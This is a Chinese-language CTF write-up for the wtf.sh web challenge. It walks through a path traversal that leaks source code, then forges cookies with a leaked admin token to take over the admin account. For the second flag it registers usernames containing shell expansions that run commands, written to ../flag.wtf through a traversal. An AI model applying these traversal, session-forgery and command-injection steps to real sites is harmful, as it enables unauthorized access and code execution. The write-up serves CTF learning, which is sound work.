@@ -1,0 +1,27 @@
+打开一片类似别人的留言的页面后，post.wtf=?post=这里有目录穿越，post.wtf=?post=../会有源码泄露。
+其中有一条，把它保存到文本重命名打开后：
+$ if contains 'user' ${!URL_PARAMS[@]} && file_exists "users/${URL_PARAMS['user']}" $ then $ local username=$(head -n 1 users/${URL_PARAMS['user']}); $ echo "
+${username}'s posts:
+"; $ echo "
+"; $ get_users_posts "${username}" | while read -r post; do $ post_slug=$(awk -F/ '{print $2 "#" $3}' <<< "${post}"); $ echo "
+$(nth_line 2 "${post}" | htmlentities)
+"; $ done $ echo "
+"; $ if is_logged_in && [[ "${COOKIES['USERNAME']}" = 'admin' ]] && [[ ${username} = 'admin' ]] $ then $ get_flag1 $ fi $ fi
+第九行可以看出来，登录并且登录的用户名cookie是admin的，登录的用户名是admin也就是admin登录然后以admin用户访问profile那个页面就可以获得flag
+查看泄露出来的源码，里面有提到users这个目录，因此输入../users，找到了admin用户：
+Posted by admin
+ae475a820a6b5ade1d2e8b427b59d53d15f1f715
+uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++fldP0scW7g3w==
+第十四行是admin用户的token。
+抓取一下登录时的包，其中的cookie：
+Cookie: last_login_info=YToxOntzOjI6ImlwIjtzOjEzOiIxODIuMTI1LjQyLjM0Ijt9; USERNAME=123; TOKEN=e199SCn357sHu/86o1WNtZgTvzVGJudJ7tiZ+ph+iZ2kZpKVYyKkBy74m0eDPx2T7nTHsYNi5pRQbAHkfk/FEQ==
+可以看到cookie主要是USERNAME和TOKEN，并且都已经知道了，因此把USERNAME改为admin，TOKEN改为上面admin的token就可以可以登录admin。
+登录以后点击profile，然后抓包，修改cookie，就可以得到flag1了。
+
+第二个flag：
+在wtf.sh中有一个功能，可以把用户名变为可执行文件。
+并且在replay.wtf中，会把用户名写入到文件当中，并且有目录穿越。因此把用户名注册成可执行的代码，然后去评论抓包，修改写入的文件名，比如../flag.wtf，然后访问就可以了
+把用户名注册成${find,/,-name,get_flag2},然后登陆，随便点开一个进行评论，然后把头部的url改为../flag.wtf，然后访问flag.wtf获得get_flag2的路径:。
+然后再注册一个用户名为$/usr/bin/get_flag2,然后重复获取get_flag2路径所要做的。
+然后访问这个就得到了flag2
+flag1和flag2拼接一下就得到了最终的flag。
